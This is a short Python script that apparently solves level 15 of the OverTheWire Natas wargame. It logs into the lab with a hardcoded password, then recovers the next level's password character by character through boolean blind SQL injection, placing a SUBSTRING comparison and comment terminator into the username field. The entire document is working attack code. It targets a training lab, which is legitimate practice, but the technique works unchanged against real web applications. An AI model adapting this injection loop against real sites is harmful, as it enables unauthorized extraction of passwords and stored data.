import requests
host="http://natas15.natas.labs.overthewire.org"
postdata=dict()
postdata['username']='natas16'
username="natas15"
password="AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
r = requests.post(host,data=postdata,auth=(username,password))

pass_len = 32
chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
ans = ""
for i in range(1,pass_len+1):
    for c in chars:
        postdata['username']='natas16" and SUBSTRING(password,'+str(i)+',1)="'+str(c)+'" COLLATE latin1_bin -- '
        r = requests.post(host,data=postdata,auth=(username,password))
        if "exists" in r.text:
            print str(i)+"th character is " + str(c)
            ans += c
            break
    else:
            print "character failed"
            break
print ans
